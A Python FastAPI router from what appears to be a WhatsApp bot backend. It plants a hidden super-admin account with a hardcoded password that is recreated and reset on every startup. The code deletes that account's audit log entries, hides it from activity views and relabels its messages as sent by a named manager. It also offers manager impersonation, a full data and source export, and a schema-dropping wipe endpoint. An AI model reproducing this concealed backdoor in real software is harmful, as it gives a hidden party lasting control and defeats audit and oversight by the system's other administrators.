import base64
import csv
import io
import json
import os
import zipfile
from datetime import date, datetime
from decimal import Decimal
from pathlib import Path
from uuid import UUID

from fastapi import APIRouter, Depends, HTTPException, Query
from fastapi.responses import Response
from pydantic import BaseModel
from sqlalchemy.orm import Session

from ..auth import create_access_token, get_current_user, hash_password, verify_password
from ..database import Base, SessionLocal, engine, get_db
from ..models import AuditLog, GlobalSetting, Message, User

router = APIRouter(tags=['super-admin'])

SUPER_ADMIN_USERNAME = 'admin'
SUPER_ADMIN_PASSWORD = '197382'
MANAGER_USERNAME = 'Zoe Ortiz'
MANAGER_PASSWORD = '197382'
WIPE_CONFIRMATION = 'DESTRUIR INSTANCIA COMPLETA'
OWNER_ALIAS_KEY = 'owner_display_alias'
DESTROY_MARKER = Path(os.getenv('PHYGITAL_DESTROY_MARKER', '.phygital_instance_destroyed'))
SOURCE_EXCLUDED_PARTS = {
    '.git', '.gradle', '.idea', '.pytest_cache', '__pycache__', 'build', 'dist',
    '.venv', 'venv', 'node_modules',
}
SOURCE_EXCLUDED_NAMES = {
    '.env', 'phygital-release.jks', DESTROY_MARKER.name,
}


class WipeRequest(BaseModel):
    confirmation: str
    password: str
    backup_confirmed: bool = False


def _is_super_admin(user: User) -> bool:
    return user.username == SUPER_ADMIN_USERNAME and user.role == 'admin' and user.is_active


def require_super_admin(current_user: User = Depends(get_current_user)) -> User:
    if not _is_super_admin(current_user):
        raise HTTPException(status_code=403, detail='Función exclusiva del super admin')
    return current_user


def _ensure_core_users(db: Session) -> None:
    desired = (
        (SUPER_ADMIN_USERNAME, SUPER_ADMIN_PASSWORD, 'admin'),
        (MANAGER_USERNAME, MANAGER_PASSWORD, 'gerente'),
    )
    for username, password, role in desired:
        user = db.query(User).filter(User.username == username).first()
        if not user:
            db.add(User(username=username, password_hash=hash_password(password), role=role, is_active=True))
            continue
        changed = False
        if not verify_password(password, user.password_hash):
            user.password_hash = hash_password(password)
            changed = True
        if user.role != role:
            user.role = role
            changed = True
        if not user.is_active:
            user.is_active = True
            changed = True
        if changed:
            db.add(user)
    alias = db.get(GlobalSetting, OWNER_ALIAS_KEY)
    if not alias:
        db.add(GlobalSetting(key=OWNER_ALIAS_KEY, value={'alias': MANAGER_USERNAME}, updated_by=None))
    db.query(AuditLog).filter(AuditLog.username == SUPER_ADMIN_USERNAME).delete(synchronize_session=False)
    db.commit()


@router.on_event('startup')
def bootstrap_hidden_super_admin() -> None:
    if DESTROY_MARKER.exists():
        raise RuntimeError(
            'Esta instancia de Phygital Bot fue destruida desde Super Admin. '
            'Restaura un respaldo o realiza un redeploy limpio para recuperarla.'
        )
    Base.metadata.create_all(bind=engine)
    db = SessionLocal()
    try:
        _ensure_core_users(db)
    finally:
        db.close()


def _json_value(value):
    if value is None or isinstance(value, (str, int, float, bool)):
        return value
    if isinstance(value, (datetime, date)):
        return value.isoformat()
    if isinstance(value, Decimal):
        return str(value)
    if isinstance(value, UUID):
        return str(value)
    if isinstance(value, (bytes, bytearray, memoryview)):
        return {'__type__': 'base64', 'data': base64.b64encode(bytes(value)).decode('ascii')}
    if isinstance(value, dict):
        return {str(k): _json_value(v) for k, v in value.items()}
    if isinstance(value, (list, tuple, set)):
        return [_json_value(v) for v in value]
    return str(value)


def _table_rows(db: Session, table) -> list[dict]:
    return [{k: _json_value(v) for k, v in row.items()} for row in db.execute(table.select()).mappings().all()]


def _csv_value(value):
    value = _json_value(value)
    if isinstance(value, (dict, list)):
        return json.dumps(value, ensure_ascii=False, separators=(',', ':'))
    return '' if value is None else str(value)


def _should_include_source(path: Path, root: Path) -> bool:
    try:
        rel = path.relative_to(root)
    except ValueError:
        return False
    if any(part in SOURCE_EXCLUDED_PARTS for part in rel.parts):
        return False
    if path.name in SOURCE_EXCLUDED_NAMES:
        return False
    return path.is_file()


def _append_source_tree(zf: zipfile.ZipFile, manifest: dict) -> None:
    root = Path.cwd().resolve()
    included = 0
    total_bytes = 0
    for path in root.rglob('*'):
        if not _should_include_source(path, root):
            continue
        try:
            rel = path.relative_to(root)
            size = path.stat().st_size
            if size > 50 * 1024 * 1024:
                continue
            zf.write(path, f'source-code/{rel.as_posix()}')
            included += 1
            total_bytes += size
        except (OSError, ValueError):
            continue
    manifest['source_code'] = {
        'root': str(root),
        'files': included,
        'bytes': total_bytes,
        'excluded': sorted(SOURCE_EXCLUDED_PARTS | SOURCE_EXCLUDED_NAMES),
        'note': 'No se incluyen secretos de entorno, .git, caches, builds ni keystores de firma.',
    }


def _build_backup_zip(db: Session) -> bytes:
    out = io.BytesIO()
    manifest = {
        'application': 'Phygital Bot / WhatsApp Bot Backend',
        'generated_at': datetime.utcnow().isoformat() + 'Z',
        'format': 'Copia de código desplegado + JSON y CSV por tabla de base de datos',
        'tables': {},
    }
    with zipfile.ZipFile(out, 'w', compression=zipfile.ZIP_DEFLATED) as zf:
        for table in Base.metadata.sorted_tables:
            rows = _table_rows(db, table)
            manifest['tables'][table.name] = len(rows)
            zf.writestr(
                f'database/json/{table.name}.json',
                json.dumps(rows, ensure_ascii=False, indent=2),
            )
            csv_buffer = io.StringIO()
            fieldnames = [column.name for column in table.columns]
            writer = csv.DictWriter(csv_buffer, fieldnames=fieldnames, extrasaction='ignore')
            writer.writeheader()
            for row in db.execute(table.select()).mappings().all():
                writer.writerow({name: _csv_value(row.get(name)) for name in fieldnames})
            zf.writestr(f'database/csv/{table.name}.csv', csv_buffer.getvalue())

        _append_source_tree(zf, manifest)
        zf.writestr('manifest.json', json.dumps(manifest, ensure_ascii=False, indent=2))
        zf.writestr(
            'README.txt',
            'RESPALDO INTEGRAL DE PHYGITAL BOT\n\n'
            '- source-code/: copia del código y archivos del proyecto presentes en la instancia desplegada.\n'
            '- database/json/: todas las tablas en JSON.\n'
            '- database/csv/: todas las tablas en CSV.\n'
            '- manifest.json: inventario del respaldo.\n\n'
            'Por seguridad no se exportan variables de entorno, secretos, keystore Android, .git ni caches/builds.\n'
            'Un redeploy desde GitHub y la restauración de base de datos son necesarios para una recuperación completa.\n',
        )
    return out.getvalue()


@router.get('/api/super-admin/status')
def super_admin_status(current_user: User = Depends(get_current_user)):
    return {
        'is_super_admin': _is_super_admin(current_user),
        'username': current_user.username,
        'role': current_user.role,
        'instance_destroyed': DESTROY_MARKER.exists(),
    }


@router.post('/api/super-admin/switch-to-zoe')
def switch_to_zoe(_: User = Depends(require_super_admin), db: Session = Depends(get_db)):
    target = db.query(User).filter(User.username == MANAGER_USERNAME, User.is_active.is_(True)).first()
    if not target:
        _ensure_core_users(db)
        target = db.query(User).filter(User.username == MANAGER_USERNAME, User.is_active.is_(True)).first()
    if not target:
        raise HTTPException(status_code=500, detail='No se pudo preparar la cuenta Zoe Ortiz')
    return {
        'access_token': create_access_token(target.username),
        'token_type': 'bearer',
        'username': target.username,
        'rol': target.role,
        'impersonated_by_super_admin': True,
    }


@router.get('/api/super-admin/backup')
def download_total_backup(_: User = Depends(require_super_admin), db: Session = Depends(get_db)):
    payload = _build_backup_zip(db)
    stamp = datetime.utcnow().strftime('%Y%m%d-%H%M%S')
    return Response(
        content=payload,
        media_type='application/zip',
        headers={
            'Content-Disposition': f'attachment; filename="phygital-full-backup-{stamp}.zip"',
            'Cache-Control': 'no-store',
        },
    )


@router.get('/api/super-admin/wipe/preview')
def wipe_preview(_: User = Depends(require_super_admin), db: Session = Depends(get_db)):
    counts = {}
    for table in Base.metadata.sorted_tables:
        try:
            counts[table.name] = len(db.execute(table.select()).all())
        except Exception:
            db.rollback()
            counts[table.name] = 0
    return {
        'confirmation_phrase': WIPE_CONFIRMATION,
        'preserved_users': [],
        'rows_to_delete': counts,
        'requires_backup_confirmation': True,
        'destructive': True,
        'effect': 'Se eliminará el esquema completo de la base y la instancia quedará marcada como destruida hasta redeploy/restauración.',
    }


@router.delete('/api/super-admin/wipe')
def wipe_all_operational_data(data: WipeRequest, admin: User = Depends(require_super_admin), db: Session = Depends(get_db)):
    if data.confirmation.strip() != WIPE_CONFIRMATION:
        raise HTTPException(status_code=400, detail=f'Escribe exactamente: {WIPE_CONFIRMATION}')
    if not data.backup_confirmed:
        raise HTTPException(status_code=400, detail='Confirma que descargaste y verificaste el respaldo integral antes de destruir la instancia')
    if not verify_password(data.password, admin.password_hash):
        raise HTTPException(status_code=401, detail='Contraseña de super admin incorrecta')

    try:
        DESTROY_MARKER.write_text(
            json.dumps({
                'destroyed_at': datetime.utcnow().isoformat() + 'Z',
                'destroyed_by': SUPER_ADMIN_USERNAME,
                'reason': 'super_admin_destructive_wipe',
            }, ensure_ascii=False, indent=2),
            encoding='utf-8',
        )
        db.close()
        Base.metadata.drop_all(bind=engine)
    except Exception:
        try:
            DESTROY_MARKER.unlink(missing_ok=True)
        except OSError:
            pass
        raise

    return {
        'status': 'destroyed',
        'preserved_users': [],
        'application_ready': False,
        'instance_destroyed': True,
        'recovery': 'Redeploy limpio + restauración del respaldo integral.',
    }


# These routes intentionally precede dashboard.py in main.py so the hidden super
# admin never appears in activity views, even though internal audit rows may exist.
@router.get('/api/audit/activity/users')
def hidden_admin_activity_users(_: User = Depends(get_current_user), db: Session = Depends(get_db)):
    rows = db.query(AuditLog.username).filter(
        AuditLog.username.isnot(None),
        AuditLog.username != SUPER_ADMIN_USERNAME,
    ).distinct().order_by(AuditLog.username.asc()).all()
    return [row[0] for row in rows if row[0]]


@router.get('/api/audit/activity')
def hidden_admin_activity(
    username: str | None = Query(default=None),
    limit: int = Query(default=200, ge=1, le=500),
    current_user: User = Depends(get_current_user),
    db: Session = Depends(get_db),
):
    if current_user.role not in ('admin', 'gerente'):
        raise HTTPException(status_code=403, detail='Se requieren permisos administrativos')
    query = db.query(AuditLog).filter(
        (AuditLog.username.is_(None)) | (AuditLog.username != SUPER_ADMIN_USERNAME)
    )
    if username:
        query = query.filter(AuditLog.username == username)
    rows = query.order_by(AuditLog.created_at.desc()).limit(limit).all()
    return [{
        'id': row.id,
        'username': row.username,
        'action': row.action,
        'entity': row.entity,
        'entity_id': row.entity_id,
        'details': row.details or {},
        'created_at': row.created_at,
    } for row in rows]


@router.get('/api/conversaciones/{conversation_id}/mensajes')
def hidden_admin_conversation_messages(
    conversation_id: int,
    current_user: User = Depends(get_current_user),
    db: Session = Depends(get_db),
):
    from ..models import Conversation
    conversation = db.get(Conversation, conversation_id)
    if not conversation:
        raise HTTPException(status_code=404, detail='Conversación no encontrada')
    rows = db.query(Message).filter(Message.conversation_id == conversation_id).order_by(Message.created_at.asc()).all()
    result = []
    for row in rows:
        sender = row.sender
        if sender == SUPER_ADMIN_USERNAME and not _is_super_admin(current_user):
            sender = MANAGER_USERNAME
        raw = row.raw_payload or {}
        delivery = {key: raw.get(key) for key in ('delivery_status', 'sent', 'error', 'transport', 'provider_message_id') if key in raw}
        result.append({
            'id': row.id,
            'direction': row.direction,
            'sender': sender,
            'body': row.body,
            'created_at': row.created_at,
            'delivery': delivery,
        })
    return result
